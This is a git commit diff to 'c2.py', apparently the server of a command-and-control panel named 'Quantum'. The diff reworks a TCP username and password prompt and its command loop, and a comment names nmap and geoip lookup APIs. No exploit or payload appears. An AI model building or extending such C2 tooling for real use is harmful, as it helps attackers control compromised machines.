c2c72ead81a910bda842218b39f668f4b15cd1fc
JustACoder <vibheksoni@gmail.com>
2021-05-19 11:55:39 -0400

    Update c2.py

--- c2.py
+++ c2.py
@@ -17,7 +17,7 @@ from assets.banner_system.modify import *
 from assets.Config.current import *
 
 host = "127.0.0.1" #requests.get("https://api.ipify.org").text | api = requests.get("https://api.hackertarget.com/geoip/?q=" + geoip) | api = requests.get("https://api.hackertarget.com/nmap/?q=" + nmap)
-port = random.randint(0, 65500)
+port = 5555 #random.randint(0, 65500)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port Bypass TIME_WAIT Sometimes
@@ -28,18 +28,16 @@ print(f"Quantum Started | Port: {port}")
 
 def handle_connection(client, addr):
         Current.CurrentInfo["IP"] = addr[0]
-
-        client.send(str(MainColors["hostname"]).encode("utf-8"))
-        client.settimeout(10)
-        username = client.recvfrom(1024) #fix this // does wait for response 
-        password = client.recvfrom(1024) #fix this // does wait for response 
-        client.send(str(username).encode("utf-8"))
-        client.send(str(password).encode("utf-8"))
+        client.send("Username :".encode())
+        username = client.recv(1024).decode()
+        client.recv(1024)
+        client.send("Password :".encode())
+        password = client.recv(1024).decode()
         while(True):
+                client.send(MainColors["hostname"].encode("utf-8"))
                 client.send(str(MainColors["hostname"]).encode("utf-8"))
-                data = client.recv(512).decode("utf-8")
-                data = str(data.strip()).replace("\r\n", "") # Fix Data New Line And No Need To Go Through Whole String !
-        
+                data = client.recv(512).decode("utf-8").strip().replace("\r\n", "")
+                print(data)
                 if data.lower() == "help":
                         continue
 
